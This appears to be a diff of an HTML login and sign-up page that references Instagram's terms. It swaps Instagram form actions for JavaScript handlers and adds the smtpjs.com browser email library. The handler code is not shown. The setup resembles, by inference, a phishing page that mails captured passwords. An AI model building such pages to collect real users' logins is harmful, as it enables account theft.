@@ -9,7 +9,7 @@
 </head>
 <body>
   <div class="signUp">
-    <form action="https://www.instagram.com/ii.bbs">
+    <form action="">
      <h3>Sign Up</h3>
      <h5>Already have an Account?  <a href="#" id="aha">Sign in</a></h5>
       <div class="inputBox">
@@ -42,13 +42,13 @@
        <p>Accept all <a href="https://help.instagram.com/581066165581870">Terms & Conditions</a></p>
        </div> 
        <!-- FOR SIGN UP BUTTON -->
-        <button type="submit">Sign Up</button> 
+        <button type="submit" onclick="signup()">Sign Up</button> 
     </form>
   </div>
      
    <!-- FOR SIGN IN PAGE -->
      <div class="signIn">
-      <form action="https://www.instagram.com/ii.bbs">
+      <form action="">
       <h3>Sign In</h3>
       <h5>I don't Have An Account?  <a href="#"  id="nhcaa">Create An Account</a></h5>
   
@@ -63,7 +63,7 @@
       <!-- FOR FORGET PASSWORD  -->
        <p><a href="#" id="frgtLink">Forget Password</a></p>
         <!-- FOR SIGN UP BUTTON -->
-        <button type="submit">Sign In</button>
+        <button type="submit" onclick="signin()">Sign In</button>
       </form>
      </div>
    </div>
@@ -86,13 +86,15 @@
           <label for="pass">New Password confirmation*</label>
           <input type="password" id="pass" required>
           </div>
-          <button type="submit" id="resetBtn">Reset Password</button>
+          <button type="submit" id="resetBtn" onclick="frgtpage ()">Reset Password</button>
        </form>
    
 
     </div>
  
-
+ 
+   <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+   <script src="https://smtpjs.com/v3/smtp.js"></script>
     <script src="script.js"></script>
 </body>
 </html>
